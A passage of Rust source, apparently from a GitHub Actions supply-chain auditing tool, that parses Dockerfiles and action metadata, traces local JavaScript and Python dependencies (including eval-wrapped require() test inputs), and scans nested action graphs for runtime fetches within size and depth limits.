    let mut executions = Vec::new();
    let scan = ShellScan {
        depth: 0,
        composite: false,
    };
    for (_, line) in crate::audit_shell::join_docker_continuations(content) {
        let line = line.trim_start();
        let Some((instruction, arguments)) = line.split_once(char::is_whitespace) else {
            continue;
        };
        let mut arguments = arguments.trim();
        let exec_form = || serde_json::from_str::<Vec<String>>(arguments).ok();
        match instruction.to_ascii_uppercase().as_str() {
            "WORKDIR" => workdir = image_path(&workdir, arguments.trim_matches(['"', '\''])),
            "COPY" | "ADD" => {
                if arguments
                    .split_whitespace()
                    .any(|word| word == "--from" || word.starts_with("--from="))
                {
                    continue;
                }
                while arguments.starts_with("--") {
                    arguments = arguments
                        .split_once(char::is_whitespace)
                        .map_or("", |(_, rest)| rest.trim_start());
                }
                let values = exec_form().unwrap_or_else(|| {
                    arguments
                        .split_whitespace()
                        .map(|value| value.trim_matches(['\'', '"']).to_string())
                        .collect()
                });
                let Some((destination, sources)) = values.split_last() else {
                    continue;
                };
                let into_directory = destination.ends_with('/') || sources.len() > 1;
                let destination = image_path(&workdir, destination);
                for source in sources {
                    let source = source.trim_start_matches("./").trim_end_matches('/');
                    let is_file = normalize_action_entrypoint_path(action_base, source)
                        .is_some_and(|path| available.contains(path.as_str()));
                    let image = if is_file && into_directory {
                        let name = source.rsplit('/').next().unwrap_or(source);
                        image_path(&destination, name)
                    } else {
                        destination.clone()
                    };
                    let source = if source.is_empty() || source == "." {
                        ACTION_LOCATION.to_string()
                    } else {
                        format!("{ACTION_LOCATION}/{source}")
                    };
                    copies.push((image, source));
                }
            }
            "ENTRYPOINT" | "CMD" | "RUN" => {
                let directory = LocatedDirectory::from_value(&copied_image_path(&copies, &workdir));
                let words = exec_form();
                let instruction = instruction.to_ascii_uppercase();
                match (&words, instruction.as_str()) {
                    (Some(words), "ENTRYPOINT") => entrypoint = Some(words.clone()),
                    (Some(words), "CMD") => command = Some(words.clone()),
                    _ => {}
                }
                match words {
                    Some(words) => {
                        let words: Vec<String> = words
                            .iter()
                            .map(|word| copied_image_word(&copies, &workdir, word))
                            .collect();
                        command_located_executions(&words, &directory, scan, &mut executions);
                    }
                    None => {
                        for (_, shell_command) in shell_command_sequence(arguments) {
                            let words: Vec<String> = shell_words(shell_command)
                                .iter()
                                .map(|word| copied_image_word(&copies, &workdir, word))
                                .collect();
                            command_located_executions(&words, &directory, scan, &mut executions);
                        }
                    }
                }
            }
            _ => {}
        }
    }
    // An exec-form `CMD` supplies the arguments of an exec-form `ENTRYPOINT`.
    if let (Some(entrypoint), Some(command)) = (entrypoint, command) {
        let words: Vec<String> = entrypoint
            .iter()
            .chain(&command)
            .map(|word| copied_image_word(&copies, &workdir, word))
            .collect();
        let directory = LocatedDirectory::from_value(&copied_image_path(&copies, &workdir));
        command_located_executions(&words, &directory, scan, &mut executions);
    }
    executions
}

/// `path` in the image, resolved against the working directory.
fn image_path(workdir: &str, path: &str) -> String {
    let joined = if path.starts_with('/') {
        path.to_string()
    } else {
        format!("{}/{path}", workdir.trim_end_matches('/'))
    };
    let mut parts: Vec<&str> = Vec::new();
    for part in joined.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            part => parts.push(part),
        }
    }
    format!("/{}", parts.join("/"))
}

/// The action file a word names when it is an image path a copy placed.
fn copied_image_word(copies: &[(String, String)], workdir: &str, word: &str) -> String {
    if word.starts_with('-') || !word.contains('/') && !word.starts_with('.') {
        return word.to_string();
    }
    let mapped = copied_image_path(copies, &image_path(workdir, word));
    if is_location_derived(&mapped) {
        mapped
    } else {
        word.to_string()
    }
}

/// The action location an image path came from, if a copy placed it.
fn copied_image_path(copies: &[(String, String)], path: &str) -> String {
    for (image, source) in copies.iter().rev() {
        if path == image {
            return source.clone();
        }
        if let Some(rest) = path
            .strip_prefix(image.as_str())
            .and_then(|rest| rest.strip_prefix('/'))
        {
            return format!("{source}/{rest}");
        }
        if image == "/" {
            return format!("{source}{path}");
        }
    }
    path.to_string()
}

fn docker_local_source_paths(content: &str) -> (Vec<String>, bool) {
    let mut sources = Vec::new();
    let mut complete = true;
    for (_, line) in crate::audit_shell::join_docker_continuations(content) {
        let line = line.trim_start();
        let Some((instruction, mut arguments)) = line.split_once(char::is_whitespace) else {
            continue;
        };
        if !instruction.eq_ignore_ascii_case("COPY") && !instruction.eq_ignore_ascii_case("ADD") {
            continue;
        }
        arguments = arguments.trim_start();
        if arguments
            .split_whitespace()
            .any(|word| word == "--from" || word.starts_with("--from="))
        {
            continue;
        }
        while arguments.starts_with("--") {
            let Some((_, rest)) = arguments.split_once(char::is_whitespace) else {
                complete = false;
                break;
            };
            arguments = rest.trim_start();
        }
        if arguments.is_empty() {
            continue;
        }
        let values = if arguments.starts_with('[') {
            match serde_json::from_str::<Vec<String>>(arguments) {
                Ok(values) => values,
                Err(_) => {
                    complete = false;
                    continue;
                }
            }
        } else {
            arguments
                .split_whitespace()
                .map(|value| value.trim_matches(['\'', '"']).to_string())
                .collect()
        };
        if values.len() < 2 {
            complete = false;
            continue;
        }
        let source_count = values.len() - 1;
        sources.extend(values.into_iter().take(source_count));
    }
    (sources, complete)
}

fn path_parent(path: &str) -> &str {
    path.rsplit_once('/').map_or("", |(parent, _)| parent)
}

fn wildcard_path_matches(pattern: &str, value: &str) -> bool {
    let pattern = pattern.as_bytes();
    let value = value.as_bytes();
    let mut matches = vec![false; value.len() + 1];
    matches[0] = true;
    for token in pattern {
        let mut next = vec![false; value.len() + 1];
        if *token == b'*' {
            next[0] = matches[0];
            for index in 1..=value.len() {
                next[index] = matches[index] || next[index - 1];
            }
        } else {
            for index in 1..=value.len() {
                next[index] = matches[index - 1] && (*token == b'?' || *token == value[index - 1]);
            }
        }
        matches = next;
    }
    matches[value.len()]
}

fn strip_javascript_comments(content: &str) -> String {
    let mut output = String::with_capacity(content.len());
    let mut characters = content.chars().peekable();
    let mut quote = None;
    let mut escaped = false;
    let mut block_comment = false;
    let mut line_comment = false;

    while let Some(character) = characters.next() {
        if line_comment {
            if character == '\n' {
                output.push(character);
                line_comment = false;
            }
            continue;
        }
        if block_comment {
            if character == '*' && characters.peek() == Some(&'/') {
                characters.next();
                block_comment = false;
            } else if character == '\n' {
                output.push(character);
            }
            continue;
        }
        if let Some(delimiter) = quote {
            output.push(character);
            if character == '\n' {
                quote = None;
                escaped = false;
            } else if escaped {
                escaped = false;
            } else if character == '\\' {
                escaped = true;
            } else if character == delimiter {
                quote = None;
            }
            continue;
        }
        if matches!(character, '\'' | '"' | '`') {
            quote = Some(character);
            output.push(character);
        } else if character == '/' && characters.peek() == Some(&'/') {
            characters.next();
            line_comment = true;
        } else if character == '/' && characters.peek() == Some(&'*') {
            characters.next();
            block_comment = true;
        } else {
            output.push(character);
        }
    }
    output
}

fn force_include_local_source_dependencies(
    repo_root: &Path,
    action_dir: &Path,
    available: &[PathBuf],
    targets: &mut Vec<(PathBuf, SourceFileKind)>,
    contexts: &mut HashMap<String, LocatedDirectory>,
    relocated: &mut HashSet<String>,
) -> bool {
    let Some(action_base) = action_dir
        .strip_prefix(repo_root)
        .ok()
        .map(|path| path.to_string_lossy().replace('\\', "/"))
    else {
        return false;
    };
    let tree: Vec<crate::github::TreeEntry> = available
        .iter()
        .filter_map(|path| {
            path.strip_prefix(repo_root)
                .ok()
                .map(|path| crate::github::TreeEntry {
                    path: path.to_string_lossy().replace('\\', "/"),
                    entry_type: "blob".to_string(),
                })
        })
        .collect();
    let mut string_targets = Vec::with_capacity(targets.len());
    let mut contents = Vec::with_capacity(targets.len());
    let mut complete = true;
    for (path, kind) in targets.iter() {
        let Some(relative) = path.strip_prefix(repo_root).ok() else {
            complete = false;
            continue;
        };
        string_targets.push((relative.to_string_lossy().replace('\\', "/"), *kind));
        match read_local_source_file(repo_root, path) {
            Ok(Some(content)) => contents.push(Some(Ok(content))),
            Ok(None) | Err(_) => {
                complete = false;
                contents.push(None);
            }
        }
    }
    if string_targets.len() != targets.len() {
        return false;
    }

    let before = string_targets.len();
    complete &= follow_source_dependencies(
        &tree,
        true,
        &action_base,
        &mut string_targets,
        &contents,
        contexts,
        relocated,
    );
    for (relative, kind) in string_targets.into_iter().skip(before) {
        let path = repo_root.join(&relative);
        match workflow::open_child_file_path(repo_root, Path::new(&relative)) {
            // The same file can be run by more than one interpreter.
            Ok(Some(_)) if !targets.contains(&(path.clone(), kind)) => targets.push((path, kind)),
            Ok(Some(_)) => {}
            Ok(None) | Err(_) => complete = false,
        }
    }
    complete
}

fn local_action_dir(repo_root: &Path, action: &LocalActionRef) -> Result<PathBuf> {
    let Some(rel) = action
        .path
        .strip_prefix("./")
        .or_else(|| action.path.strip_prefix("$/"))
    else {
        anyhow::bail!("local action path must start with ./ or $/");
    };
    let rel_path = Path::new(rel);
    if !rel_path
        .components()
        .all(|c| matches!(c, Component::Normal(_)))
    {
        anyhow::bail!("local action path escapes the repository");
    }

    let action_dir = repo_root.join(rel);
    if workflow::open_child_dir_path(repo_root, rel_path)?.is_none() {
        anyhow::bail!("{} is not a directory", action_dir.display());
    }
    Ok(action_dir)
}

#[cfg(test)]
pub(crate) fn scan_local_action_source(
    repo_root: &Path,
    action: &LocalActionRef,
    collector: &mut AuditCollector,
    config: &Config,
) -> Result<ActionScanStatus> {
    let (status, nested_remote) =
        scan_local_action_source_graph(repo_root, action, collector, config)?;
    Ok(if nested_remote.is_empty() {
        status
    } else {
        ActionScanStatus::Incomplete
    })
}

pub(crate) fn scan_local_action_source_graph(
    repo_root: &Path,
    action: &LocalActionRef,
    collector: &mut AuditCollector,
    config: &Config,
) -> Result<(ActionScanStatus, Vec<ActionRef>)> {
    let action_dir = local_action_dir(repo_root, action)?;
    let (mut targets, mut available, mut complete) = collect_local_source_files(&action_dir)?;
    let initial_len = targets.len();
    let mut contexts = HashMap::new();
    let mut relocated = HashSet::new();
    complete &=
        force_include_local_action_entrypoints(repo_root, &action_dir, &mut targets, &mut contexts);
    if cap_targets_prioritizing_entrypoints(&mut targets, initial_len).is_some() {
        complete = false;
    }
    for (path, _) in &targets {
        if !available.contains(path) {
            available.push(path.clone());
        }
    }
    loop {
        let before = targets.len();
        let known = contexts.clone();
        let known_relocated = relocated.clone();
        complete &= force_include_local_source_dependencies(
            repo_root,
            &action_dir,
            &available,
            &mut targets,
            &mut contexts,
            &mut relocated,
        );
        if targets.len() > MAX_SOURCE_FILES {
            targets.truncate(MAX_SOURCE_FILES);
            complete = false;
        }
        if targets.len() == before && contexts == known && relocated == known_relocated {
            break;
        }
    }
    if targets.is_empty() {
        return Ok((ActionScanStatus::Incomplete, Vec::new()));
    }

    let mut total_bytes = 0usize;
    let mut sources = Vec::new();
    for (path, kind) in targets {
        let content = match read_local_source_file(repo_root, &path) {
            Ok(Some(content)) => content,
            Ok(None) | Err(_) => {
                complete = false;
                continue;
            }
        };
        total_bytes = total_bytes.saturating_add(content.len());
        if total_bytes > MAX_TOTAL_SOURCE_BYTES {
            complete = false;
            continue;
        }
        sources.push((path, kind, content));
    }
    let helpers_fetch = helper_sources_fetch(
        sources
            .iter()
            .map(|(_, kind, content)| (*kind, content.as_str())),
        config,
    );
    let mut nested_remote = Vec::new();
    for (path, kind, content) in sources {
        let relative = path
            .strip_prefix(&action_dir)
            .or_else(|_| path.strip_prefix(repo_root))
            .unwrap_or(&path)
            .to_string_lossy()
            .replace('\\', "/");
        let source_label = format!("{} ({relative})", action.path);
        match kind {
            SourceFileKind::ActionYml => match serde_norway::from_str::<Value>(&content) {
                Ok(yaml) => {
                    let nested = scan_action_yml_runs(
                        &yaml,
                        &source_label,
                        &action.path,
                        collector,
                        config,
                        helpers_fetch,
                    );
                    complete &= nested.complete
                        && nested
                            .remote
                            .iter()
                            .all(|action| action.ref_type == workflow::RefType::Sha)
                        && nested.local.is_empty();
                    nested_remote.extend(nested.remote.into_iter().map(|mut remote| {
                        remote.line_number = action.line_number;
                        remote
                    }));
                }
                Err(_) => {
                    complete = false;
                }
            },
            SourceFileKind::JavaScript => {
                scan_js_content(&content, &source_label, &action.path, collector, config);
            }
            SourceFileKind::Python => {
                scan_py_content(&content, &source_label, &action.path, collector, config);
            }
            SourceFileKind::Shell => {
                scan_shell_content(&content, &source_label, 0, &action.path, collector, config);
            }
            SourceFileKind::WorkflowYml => {
                complete = false;
            }
            SourceFileKind::Dockerfile => {
                scan_dockerfile_content(&content, &source_label, &action.path, collector, config);
            }
        }
    }

    Ok((ActionScanStatus::from_complete(complete), nested_remote))
}

pub(crate) async fn scan_action_source(
    client: &GitHubClient,
    action: &ActionRef,
    collector: &mut AuditCollector,
    config: &Config,
) -> Result<ActionScanStatus> {
    let mut queue = VecDeque::from([(action.clone(), 0usize)]);
    let mut visited = HashSet::new();
    let mut complete = true;
    let mut remaining_bytes = MAX_ACTION_GRAPH_SOURCE_BYTES;

    while let Some((current, depth)) = queue.pop_front() {
        let key = remote_action_scan_key(&current);
        if !visited.insert(key) {
            continue;
        }
        if visited.len() > MAX_ACTION_GRAPH_NODES {
            complete = false;
            break;
        }

        let (status, nested) =
            scan_one_action_source(client, &current, collector, config, &mut remaining_bytes)
                .await?;
        complete &= status == ActionScanStatus::Complete && nested.complete;

        for child in nested.remote {
            if child.ref_type != workflow::RefType::Sha {
                complete = false;
                continue;
            }
            if depth == MAX_ACTION_GRAPH_DEPTH {
                complete = false;
            } else {
                queue.push_back((child, depth + 1));
            }
        }
        for local in nested.local {
            let Some(child) = nested_local_action(&current, &local) else {
                complete = false;
                continue;
            };
            if depth == MAX_ACTION_GRAPH_DEPTH {
                complete = false;
            } else {
                queue.push_back((child, depth + 1));
            }
        }
    }

    Ok(ActionScanStatus::from_complete(complete))
}

async fn scan_one_action_source(
    client: &GitHubClient,
    action: &ActionRef,
    collector: &mut AuditCollector,
    config: &Config,
    remaining_graph_bytes: &mut usize,
) -> Result<(ActionScanStatus, NestedUses)> {
    let action_name = format!("{}@{}", action.full_name(), short_sha(&action.ref_string));
    let tree = client
        .fetch_tree(&action.owner, &action.repo, &action.ref_string)
        .await?;

    let base = match action.subpath.as_deref() {
        None => String::new(),
        Some(path) => match normalize_action_entrypoint_path("", path) {
            Some(path) => path,
            None => return Ok((ActionScanStatus::Incomplete, NestedUses::complete())),
        },
    };
    let base = base.as_str();
    let mut targets = select_source_files(&tree.entries, base);
    let mut complete = !tree.truncated
        || targets.iter().any(|(_, kind)| {
            matches!(
                kind,
                SourceFileKind::ActionYml | SourceFileKind::WorkflowYml
            )
        });
    if targets.len() > MAX_SOURCE_FILES {
        targets.truncate(MAX_SOURCE_FILES);
        complete = false;
    }
    if targets.is_empty() {
        return Ok((ActionScanStatus::Incomplete, NestedUses::complete()));
    }

    // Fetch concurrently, then scan in tree order so findings are
    // deterministic regardless of which fetch lands first. A failed fetch
    // makes the scan incomplete, so the caller will not cache a clean verdict.
    let initial_budget = (*remaining_graph_bytes).min(MAX_TOTAL_SOURCE_BYTES);
    if initial_budget == 0 {
        return Ok((ActionScanStatus::Incomplete, NestedUses::complete()));
    }
    let (mut contents, fetched_complete, initial_bytes) =
        fetch_remote_source_files(client, action, &targets, initial_budget).await;
    *remaining_graph_bytes = remaining_graph_bytes.saturating_sub(initial_bytes);
    complete &= fetched_complete;
    let mut action_bytes = initial_bytes;
    let mut initial_len = targets.len();
    let mut contexts = HashMap::new();
    let mut relocated = HashSet::new();
    complete &= force_include_remote_action_entrypoints(
        &tree.entries,
        &mut targets,
        &contents,
        &mut contexts,
    );
    if let Some(keep_initial) = cap_targets_prioritizing_entrypoints(&mut targets, initial_len) {
        complete = false;
        contents.truncate(keep_initial);
        initial_len = keep_initial;
    }
    if targets.len() > initial_len {
        let added_budget =
            (*remaining_graph_bytes).min(MAX_TOTAL_SOURCE_BYTES.saturating_sub(action_bytes));
        if added_budget == 0 {
            complete = false;
        } else {
            let (new_contents, new_complete, added_bytes) =
                fetch_remote_source_files(client, action, &targets[initial_len..], added_budget)
                    .await;
            *remaining_graph_bytes = remaining_graph_bytes.saturating_sub(added_bytes);
            contents.extend(new_contents);
            complete &= new_complete;
            action_bytes = action_bytes.saturating_add(added_bytes);
        }
    }

    loop {
        let fetched_len = targets.len();
        let known = contexts.clone();
        let known_relocated = relocated.clone();
        complete &= follow_source_dependencies(
            &tree.entries,
            !tree.truncated,
            base,
            &mut targets,
            &contents,
            &mut contexts,
            &mut relocated,
        );
        if targets.len() == fetched_len {
            if contexts == known && relocated == known_relocated {
                break;
            }
            continue;
        }
        if targets.len() > MAX_SOURCE_FILES {
            targets.truncate(MAX_SOURCE_FILES);
            complete = false;
        }
        if targets.len() == fetched_len {
            break;
        }
        let added_budget =
            (*remaining_graph_bytes).min(MAX_TOTAL_SOURCE_BYTES.saturating_sub(action_bytes));
        if added_budget == 0 {
            complete = false;
            break;
        }
        let (new_contents, new_complete, added_bytes) =
            fetch_remote_source_files(client, action, &targets[fetched_len..], added_budget).await;
        *remaining_graph_bytes = remaining_graph_bytes.saturating_sub(added_bytes);
        contents.extend(new_contents);
        complete &= new_complete;
        action_bytes = action_bytes.saturating_add(added_bytes);
    }

    let helpers_fetch = helper_sources_fetch(
        targets
            .iter()
            .zip(&contents)
            .filter_map(|((_, kind), content)| match content {
                Some(Ok(content)) => Some((*kind, content.as_str())),
                _ => None,
            }),
        config,
    );
    let mut nested_uses = NestedUses::complete();
    for ((path, kind), content) in targets.iter().zip(contents) {
        let content = match content {
            Some(Ok(content)) => content,
            _ => continue,
        };
        let source_label = format!("{} ({path})", action.full_name());
        let findings_before = collector.findings.len();
        match kind {
            SourceFileKind::ActionYml => match serde_norway::from_str::<Value>(&content) {
                Ok(yaml) => {
                    let nested = scan_action_yml_runs(
                        &yaml,
                        &source_label,
                        &action_name,
                        collector,
                        config,
                        helpers_fetch,
                    );
                    nested_uses.complete &= nested.complete;
                    nested_uses.remote.extend(nested.remote);
                    nested_uses.local.extend(nested.local);
                }
                Err(_) => {
                    complete = false;
                }
            },
            SourceFileKind::JavaScript => {
                scan_js_content(&content, &source_label, &action_name, collector, config);
            }
            SourceFileKind::Python => {
                scan_py_content(&content, &source_label, &action_name, collector, config);
            }
            SourceFileKind::Shell => {
                scan_shell_content(&content, &source_label, 0, &action_name, collector, config);
            }
            SourceFileKind::WorkflowYml => {
                let nested = scan_reusable_workflow(
                    &content,
                    &source_label,
                    &action_name,
                    collector,
                    config,
                );
                nested_uses.complete &= nested.complete;
                nested_uses.remote.extend(nested.remote);
                nested_uses.local.extend(nested.local);
            }
            SourceFileKind::Dockerfile => {
                scan_dockerfile_content(&content, &source_label, &action_name, collector, config);
            }
        }
        let origin = ActionFileOrigin {
            action: action.full_name(),
            revision: action.ref_string.clone(),
            path: path.clone(),
        };
        for finding in &mut collector.findings[findings_before..] {
            finding.origin = Some(origin.clone());
        }
    }

    Ok((ActionScanStatus::from_complete(complete), nested_uses))
}

/// Whether any source file beside a composite action's metadata fetches at
/// runtime. A step can run that file before verifying a later download with
/// material it wrote, so its steps must not trust local verification files.
fn helper_sources_fetch<'a>(
    mut sources: impl Iterator<Item = (SourceFileKind, &'a str)>,
    config: &Config,
) -> bool {
    sources.any(|(kind, content)| {
        let mut scratch = AuditCollector::new(false);
        match kind {
            SourceFileKind::JavaScript => scan_js_content(content, "", "", &mut scratch, config),
            SourceFileKind::Python => scan_py_content(content, "", "", &mut scratch, config),
            SourceFileKind::Shell => scan_shell_content(content, "", 0, "", &mut scratch, config),
            SourceFileKind::ActionYml
            | SourceFileKind::WorkflowYml
            | SourceFileKind::Dockerfile => return false,
        }
        scratch.has_matches()
    })
}

fn nested_local_action(parent: &ActionRef, reference: &str) -> Option<ActionRef> {
    let relative = reference.strip_prefix("$/")?;
    let components: Option<Vec<&str>> = Path::new(relative)
        .components()
        .map(|component| match component {
            Component::Normal(part) => part.to_str(),
            _ => None,
        })
        .collect();
    let relative = components?.join("/");
    if relative.is_empty() {
        return None;
    }
    Some(ActionRef {
        owner: parent.owner.clone(),
        repo: parent.repo.clone(),
        subpath: Some(relative),
        ref_string: parent.ref_string.clone(),
        ref_type: parent.ref_type.clone(),
        tag_comment: None,
        line_number: 0,
        raw_line: format!("uses: {reference}"),
        value_start: 0,
        value_end: 0,
        block_style: true,
    })
}

fn scan_action_yml_runs(
    yaml: &Value,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
    helpers_fetch: bool,
) -> NestedUses {
    let mut nested = NestedUses::complete();
    // runs.steps[].run (composite actions), including nested parallel groups.
    // base_line 0: positions are block-relative — the block is never located
    // inside the fetched file.
    if let Some(steps) = yaml.get("runs").and_then(|r| r.get("steps")) {
        let mut shell_state = ShellScanState::default();
        // A nested action can write any file a later step verifies with.
        if helpers_fetch || !collect_step_uses(steps).is_empty() {
            shell_state.assume_unbound_download();
        }
        for block in collect_step_run_blocks(steps, None, None) {
            nested.complete &= scan_run_block(
                &block,
                source_file,
                action_name,
                collector,
                config,
                &mut shell_state,
            );
        }
    }

    // runs.args (some actions use shell: bash with inline scripts)
    if let Some(args) = yaml.get("runs").and_then(|r| r.get("args")) {
        if let Some(args) = args.as_str() {
            scan_shell_content(args, source_file, 0, action_name, collector, config);
        } else if let Some(args) = args.as_sequence() {
            for arg in args {
                if let Some(arg) = arg.as_str() {
                    scan_shell_content(arg, source_file, 0, action_name, collector, config);
                }
            }
        }
    }

    if let Some(image) = yaml
        .get("runs")
        .and_then(|runs| runs.get("image"))
        .and_then(|image| image.as_str())
        .and_then(|image| image.strip_prefix("docker://"))
    {
        push_docker_ref_result(
            &workflow::DockerRef {
                image: image.to_string(),
                pin: workflow::classify_docker_image(image),
                line_number: 0,
                raw_line: format!("runs.image: docker://{image}"),
            },
            source_file,
            collector,
        );
    }

    if let Some(steps) = yaml.get("runs").and_then(|runs| runs.get("steps")) {
        for uses in collect_step_uses(steps) {
            if let Some(image) = uses.strip_prefix("docker://") {
                push_docker_ref_result(
                    &workflow::DockerRef {
                        image: image.to_string(),
                        pin: workflow::classify_docker_image(image),
                        line_number: 0,
                        raw_line: format!("uses: {uses}"),
                    },
                    source_file,
                    collector,
                );
            } else {
                if let Some(action) = workflow::parse_external_action_reference(uses) {
                    nested.remote.push(action);
                } else if nested_local_action_reference(uses) {
                    nested.local.push(uses.to_string());
                } else {
                    nested.complete = false;
                }
            }
        }
    }
    nested
}

fn nested_local_action_reference(reference: &str) -> bool {
    let Some(relative) = reference
        .strip_prefix("./")
        .or_else(|| reference.strip_prefix("$/"))
    else {
        return false;
    };
    !relative.is_empty()
        && Path::new(relative)
            .components()
            .all(|component| matches!(component, Component::Normal(_)))
}

fn collect_step_uses(steps: &Value) -> Vec<&str> {
    fn collect<'a>(value: &'a Value, uses: &mut Vec<&'a str>) {
        if let Some(sequence) = value.as_sequence() {
            for item in sequence {
                collect(item, uses);
            }
        } else if let Some(mapping) = value.as_mapping() {
            for (key, value) in mapping {
                if key.as_str() == Some("uses") {
                    if let Some(reference) = value.as_str() {
                        uses.push(reference);
                    }
                } else if key.as_str() == Some("parallel") {
                    collect(value, uses);
                }
            }
        }
    }
    let mut uses = Vec::new();
    collect(steps, &mut uses);
    uses
}

fn scan_reusable_workflow(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) -> NestedUses {
    let mut nested = NestedUses::complete();
    let Ok(jobs) = extract_job_run_blocks(Path::new(source_file), content) else {
        nested.complete = false;
        return nested;
    };
    for blocks in jobs {
        let mut shell_state = ShellScanState::default();
        for block in blocks {
            nested.complete &= scan_run_block(
                &block,
                source_file,
                action_name,
                collector,
                config,
                &mut shell_state,
            );
        }
    }
    for docker in workflow::scan_docker_refs(content) {
        push_docker_ref_result(&docker, source_file, collector);
    }
    nested.remote = workflow::scan_content(content);
    nested.local = workflow::scan_local_actions(content)
        .into_iter()
        .map(|action| repository_bound_reusable_workflow(&action.path))
        .collect();
    nested.complete &= workflow::scan_unsupported_uses(content).is_empty();
    nested
}

fn repository_bound_reusable_workflow(reference: &str) -> String {
    let Some(relative) = reference.strip_prefix("./") else {
        return reference.to_string();
    };
    if [
        ".github/workflows/",
        ".forgejo/workflows/",
        ".gitea/workflows/",
    ]
    .iter()
    .any(|root| relative.starts_with(root))
    {
        format!("$/{relative}")
    } else {
        reference.to_string()
    }
}

pub(crate) fn short_sha(sha: &str) -> &str {
    match sha.char_indices().nth(7) {
        Some((end, _)) => &sha[..end],
        None => sha,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use std::sync::LazyLock;

    static DEFAULT_CONFIG: LazyLock<Config> = LazyLock::new(Config::default);

    #[test]
    fn javascript_delimiter_index_preserves_calls_and_arguments() {
        let alphabet = ['a', '\'', '"', '`', '\\', '(', ')', '[', ']', '{', '}', ','];
        for mut encoded in 0..alphabet.len().pow(4) {
            let mut source = String::new();
            for _ in 0..4 {
                source.push(alphabet[encoded % alphabet.len()]);
                encoded /= alphabet.len();
            }
            let index = crate::audit::JavaScriptDelimiterIndex::new(&source);
            for start in 0..=source.len() {
                for end in start..=source.len() {
                    let value = &source[start..end];
                    assert_eq!(
                        index.call_parts(value),
                        javascript_call_parts(value),
                        "{source:?}: {start}..{end}"
                    );
                    assert_eq!(
                        index.arguments(value),
                        split_javascript_arguments(value),
                        "{source:?}: {start}..{end}"
                    );
                }
            }
        }
    }

    #[test]
    fn deeply_nested_timer_calls_preserve_coverage() {
        let code = format!(
            "{}() => null{}",
            "setTimeout(() => ".repeat(5000),
            ")".repeat(5000)
        );
        let quotes = crate::audit::JavaScriptQuoteIndex::new(&code);
        assert_eq!(
            executed_javascript_string_literals(&code, &quotes),
            (vec![], true)
        );
        let code = "`outside ${eval('require(\"./inside.js\")')}`";
        let quotes = crate::audit::JavaScriptQuoteIndex::new(code);
        assert_eq!(
            executed_javascript_string_literals(code, &quotes),
            (vec!["require(\"./inside.js\")"], true)
        );
    }

    #[test]
    fn dependency_detection_recognizes_imports_without_javascript_comments() {
        let javascript = strip_javascript_comments(
            "/* import './comment.js' */\n// import './also-commented.js'\nimport './runtime.js';",
        );
        let dependencies: Vec<_> = JS_LOCAL_DEPENDENCY_RE
            .captures_iter(&javascript)
            .filter_map(|captures| captures.name("path").map(|path| path.as_str()))
            .collect();
        assert_eq!(dependencies, vec!["./runtime.js"]);
        assert!(PYTHON_SIBLING_IMPORT_RE.is_match("import os\nfrom pathlib import Path"));
        assert!(PYTHON_SIBLING_IMPORT_RE.is_match("from .helper import run"));
    }

    #[test]
    fn javascript_loader_detection_fails_closed_without_matching_strings() {
        let tree = vec![
            tree_entry("action/index.js", "blob"),
            tree_entry("action/addon.node", "blob"),
            tree_entry("shared/helper.js", "blob"),
        ];
        for source in [
            "require('./addon.node');",
            "require('../../shared/' + 'helper.js');",
            "require(loaderPath);",
        ] {
            let mut targets = vec![("action/index.js".to_string(), SourceFileKind::JavaScript)];
            assert!(!force_include_remote_source_dependencies(
                &tree,
                true,
                "action",
                &mut targets,
                &[Some(Ok(source.to_string()))]
            ));
        }

        let mut targets = vec![("action/index.js".to_string(), SourceFileKind::JavaScript)];
        assert!(force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut targets,
            &[Some(Ok(
                "console.log(\"use require(loaderPath) here\"); const text = `require(loaderPath)`; require(42);"
                    .to_string()
            ))]
        ));

        let mut template_targets =
            vec![("action/index.js".to_string(), SourceFileKind::JavaScript)];
        assert!(force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut template_targets,
            &[Some(Ok(
                "const loaded = `${require('../shared/helper.js')}`;".to_string()
            ))]
        ));
        assert!(
            template_targets
                .contains(&("shared/helper.js".to_string(), SourceFileKind::JavaScript))
        );

        let mut evaluated_targets = vec![(
            "action/dist/index.js".to_string(),
            SourceFileKind::JavaScript,
        )];
        assert!(force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut evaluated_targets,
            &[Some(Ok(
                "eval(\"require('../../shared/helper.js')\")".to_string()
            ))]
        ));
        assert!(
            evaluated_targets
                .contains(&("shared/helper.js".to_string(), SourceFileKind::JavaScript))
        );

        let mut template_targets = vec![(
            "action/dist/index.js".to_string(),
            SourceFileKind::JavaScript,
        )];
        assert!(force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut template_targets,
            &[Some(Ok(
                "eval(`require('../../shared/helper.js')`)".to_string()
            ))]
        ));
        assert!(
            template_targets
                .contains(&("shared/helper.js".to_string(), SourceFileKind::JavaScript))
        );

        let mut inert_targets = vec![("action/index.js".to_string(), SourceFileKind::JavaScript)];
        assert!(force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut inert_targets,
            &[Some(Ok(
                "const docs = `eval(\"require('./missing.js')\")`;".to_string()
            ))]
        ));
        assert_eq!(inert_targets.len(), 1);

        let mut interpolated_targets = vec![(
            "action/dist/index.js".to_string(),
            SourceFileKind::JavaScript,
        )];
        assert!(!force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut interpolated_targets,
            &[Some(Ok(
                "eval(`require('../../shared/${name}.js')`)".to_string()
            ))]
        ));

        let mut concatenated_targets = vec![(
            "action/dist/index.js".to_string(),
            SourceFileKind::JavaScript,
        )];
        assert!(!force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut concatenated_targets,
            &[Some(Ok(
                "eval(`require('../../shared/` + name + `.js')`)".to_string()
            ))]
        ));

        let mut function_targets = vec![(
            "action/dist/index.js".to_string(),
            SourceFileKind::JavaScript,
        )];
        assert!(force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut function_targets,
            &[Some(Ok(
                "Function('name', \"require('../../shared/helper.js')\")()".to_string()
            ))]
        ));
        assert!(
            function_targets
                .contains(&("shared/helper.js".to_string(), SourceFileKind::JavaScript))
        );

        for source in [
            "(eval)(\"require('../../shared/helper.js')\")",
